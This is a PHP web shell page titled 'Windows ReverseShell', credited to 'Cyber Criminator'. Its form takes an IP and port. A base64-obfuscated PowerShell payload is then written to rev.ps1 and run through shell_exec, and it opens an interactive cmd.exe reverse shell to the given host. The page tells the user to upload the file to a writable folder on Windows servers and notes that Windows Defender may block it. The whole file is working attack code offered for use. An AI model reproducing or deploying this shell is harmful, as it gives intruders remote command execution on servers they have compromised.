<!DOCTYPE html>
<html>
<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Anonymous+Pro&display=swap" rel="stylesheet">
<head>
	<title>Windows ReverseShell</title>
</head>

<style>
	body {
		background-color: black;
		color:#39FF14;
		font-family: 'Anonymous Pro', monospace;
		text-align:center;
	}
	.art{
		width:100%;
		margin-top:10vh;
	}
	pre {
		color:#7cbb00;
	}
	span[color=red] {
		color: #f65314;
	}
	span[color=blue] {
		color:#00a1f1;
	}
	span[color=yellow] {
		color:#ffbb00;
	}
	form {
		margin:20px;
	}
	form input {
		color:#39FF14;
		padding:10px;
		background-color: #232323;
		border: none;
		outline: none;
		transition:0.3s;
	}
	form input:focus {
		border: none;
		outline: none;
	}
	form input[type=submit]:hover{
		background-color:white;
		color:black;
	}
	.disclaimer {
	   position: fixed; 
	   font-size:70%;    
	   opacity:0.7;
       text-align: center;    
       bottom: 0px; 
       width: 100%;
       margin:0 0 20px 0;
	}
	a {
		text-decoration: none;
		color:#00a1f1;
	}
</style>

<body>
<div class="art">
<pre>
                  .oodMMMMMMMMMMMMM
<span color=red>      ..oodMMM</span>  MMMMMMMMMMMMMMMMMMM
<span color=red>oodMMMMMMMMMMM</span>  MMMMMMMMMMMMMMMMMMM
<span color=red>MMMMMMMMMMMMMM</span>  MMMMMMMMMMMMMMMMMMM
<span color=red>MMMMMMMMMMMMMM</span>  MMMMMMMMMMMMMMMMMMM
<span color=red>MMMMMMMMMMMMMM</span>  MMMMMMMMMMMMMMMMMMM
<span color=red>MMMMMMMMMMMMMM</span>  MMMMMMMMMMMMMMMMMMM
<span color=red>MMMMMMMMMMMMMM</span>  MMMMMMMMMMMMMMMMMMM
 
 <span color=blue>MMMMMMMMMMMMMM</span>  <span color=yellow>MMMMMMMMMMMMMMMMMMM</span>
 <span color=blue>MMMMMMMMMMMMMM</span>  <span color=yellow>MMMMMMMMMMMMMMMMMMM</span>
 <span color=blue>MMMMMMMMMMMMMM</span>  <span color=yellow>MMMMMMMMMMMMMMMMMMM</span>
 <span color=blue>MMMMMMMMMMMMMM</span>  <span color=yellow>MMMMMMMMMMMMMMMMMMM</span>
 <span color=blue>MMMMMMMMMMMMMM</span>  <span color=yellow>MMMMMMMMMMMMMMMMMMM</span>
 <span color=blue>`^^^^^^MMMMMMM</span>  <span color=yellow>MMMMMMMMMMMMMMMMMMM</span>
 <span color=blue>      ````^^^^</span>  <span color=yellow>^^MMMMMMMMMMMMMMMMM</span>
                      <span color=yellow>````^^^^^^MMMM</span>
</pre>
Windows Reverse Shell
</div>

<form action="" method="GET">
	<input type="text" name="ip" placeholder="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
	<input type="text" name="port" placeholder="31337">
	<input type="submit" value=">>">
</form>
<p class="disclaimer">
	This obviously only works with Windows Servers. <br>These might not work with win servers that has enabled WindowsDefender. <br>Upload this in a writable folder | Coded by <a href="https://github.com/cybercriminator">Ramil Feyziyev</a>
	</p>
</body>

</html>


<?php

function rshell($ip, $port){
	$rev = base64_decode('JHNvY2tldCA9IG5ldy1vYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRjcENsaWVudCgn').$ip."', ".$port.
	base64_decode('KTsKaWYoJHNvY2tldCAtZXEgJG51bGwpe2V4aXQgMX0KJHN0cmVhbSA9ICRzb2NrZXQuR2V0U3RyZWFtKCk7CiR3cml0ZXIgPSBuZXctb2JqZWN0IFN5c3RlbS5JTy5TdHJlYW1Xcml0ZXIoJHN0cmVhbSk7CiRidWZmZXIgPSBuZXctb2JqZWN0IFN5c3RlbS5CeXRlW10gMTAyNDsKJGVuY29kaW5nID0gbmV3LW9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nOwokZGF0ZSA9IEdldC1EYXRlOwokd3JpdGVyLldyaXRlTGluZSgiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7CiR3cml0ZXIuV3JpdGVMaW5lKCJbK10gQ29ubmVjdGlvbiBFc3RhYmxpc2hlZCIpOwokd3JpdGVyLldyaXRlTGluZSgiWytdIFdlbGNvbWUgdG8gQ3liZXIgQ3JpbWluYXRvciBSZXZlcnNlIFNoZWxsIik7CiR3cml0ZXIuV3JpdGVMaW5lKCJbK10gUmFtaWwgRmV5eml5ZXYiKTsKJHdyaXRlci5Xcml0ZUxpbmUoIlsrXSBDdXJyZW50IERhdGU6ICRkYXRlIik7CiR3cml0ZXIuV3JpdGVMaW5lKCI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKTsKJHdyaXRlci5Xcml0ZUxpbmUoIiAiKTsKZG8KewoJJHB3ZCA9IEdldC1Mb2NhdGlvbjsKCSR3cml0ZXIuV3JpdGUoIiRwd2Q+ICIpOwoJJHdyaXRlci5GbHVzaCgpOwoJJHJlYWQgPSAkbnVsbDsKCSRyZXMgPSAiIgoJd2hpbGUoJHN0cmVhbS5EYXRhQXZhaWxhYmxlIC1vciAkcmVhZCAtZXEgJG51bGwpIHsKCQkkcmVhZCA9ICRzdHJlYW0uUmVhZCgkYnVmZmVyLCAwLCAxMDI0KQoJfQoJJG91dCA9ICRlbmNvZGluZy5HZXRTdHJpbmcoJGJ1ZmZlciwgMCwgJHJlYWQpLlJlcGxhY2UoImByYG4iLCIiKS5SZXBsYWNlKCJgbiIsIiIpOwoJaWYoISRvdXQuZXF1YWxzKCJleGl0IikpewoJCSRhcmdzID0gIiI7CgkJaWYoJG91dC5JbmRleE9mKCcgJykgLWd0IC0xKXsKCQkJJGFyZ3MgPSAkb3V0LnN1YnN0cmluZygkb3V0LkluZGV4T2YoJyAnKSsxKTsKCQkJJG91dCA9ICRvdXQuc3Vic3RyaW5nKDAsJG91dC5JbmRleE9mKCcgJykpOwoJCQlpZigkYXJncy5zcGxpdCgnICcpLmxlbmd0aCAtZ3QgMSl7CiAgICAgICAgICAgICAgICAkcGluZm8gPSBOZXctT2JqZWN0IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvCiAgICAgICAgICAgICAgICAkcGluZm8uRmlsZU5hbWUgPSAiY21kLmV4ZSIKICAgICAgICAgICAgICAgICRwaW5mby5SZWRpcmVjdFN0YW5kYXJkRXJyb3IgPSAkdHJ1ZQogICAgICAgICAgICAgICAgJHBpbmZvLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgPSAkdHJ1ZQogICAgICAgICAgICAgICAgJHBpbmZvLlVzZVNoZWxsRXhlY3V0ZSA9ICRmYWxzZQogICAgICAgICAgICAgICAgJHBpbmZvLkFyZ3VtZW50cyA9ICIvYyAkb3V0ICRhcmdzIgogICAgICAgICAgICAgICAgJHAgPSBOZXctT2JqZWN0IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzCiAgICAgICAgICAgICAgICAkcC5TdGFydEluZm8gPSAkcGluZm8KICAgICAgICAgICAgICAgICRwLlN0YXJ0KCkgfCBPdXQtTnVsbAogICAgICAgICAgICAgICAgJHAuV2FpdEZvckV4aXQoKQogICAgICAgICAgICAgICAgJHN0ZG91dCA9ICRwLlN0YW5kYXJkT3V0cHV0LlJlYWRUb0VuZCgpCiAgICAgICAgICAgICAgICAkc3RkZXJyID0gJHAuU3RhbmRhcmRFcnJvci5SZWFkVG9FbmQoKQogICAgICAgICAgICAgICAgaWYgKCRwLkV4aXRDb2RlIC1uZSAwKSB7CiAgICAgICAgICAgICAgICAgICAgJHJlcyA9ICRzdGRlcnIKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJHJlcyA9ICRzdGRvdXQKICAgICAgICAgICAgICAgIH0KCQkJfQoJCQllbHNlewoJCQkJJHJlcyA9ICgmIiRvdXQiICIkYXJncyIpIHwgb3V0LXN0cmluZzsKCQkJfQoJCX0KCQllbHNlewoJCQkkcmVzID0gKCYiJG91dCIpIHwgb3V0LXN0cmluZzsKCQl9CgkJaWYoJHJlcyAtbmUgJG51bGwpewogICAgICAgICR3cml0ZXIuV3JpdGVMaW5lKCRyZXMpCiAgICB9Cgl9Cn1XaGlsZSAoISRvdXQuZXF1YWxzKCJleGl0IikpCiR3cml0ZXIuY2xvc2UoKTsKJHNvY2tldC5jbG9zZSgpOwokc3RyZWFtLkRpc3Bvc2UoKQ==');
	$file = fopen('rev.ps1','w');
	fwrite($file,$rev);
	fclose($file);
	echo shell_exec('powershell -c ".\rev.ps1"');
}


if (isset($_GET['ip']) && isset($_GET['port'])) {
	$ip = $_GET['ip'];
	$port = $_GET['port'];
	rshell($ip, $port);
}
else {
	echo '<script>alert`DO NOT RECODE!\r\n\r\n- Cyber Criminator`</script>';
}

?>
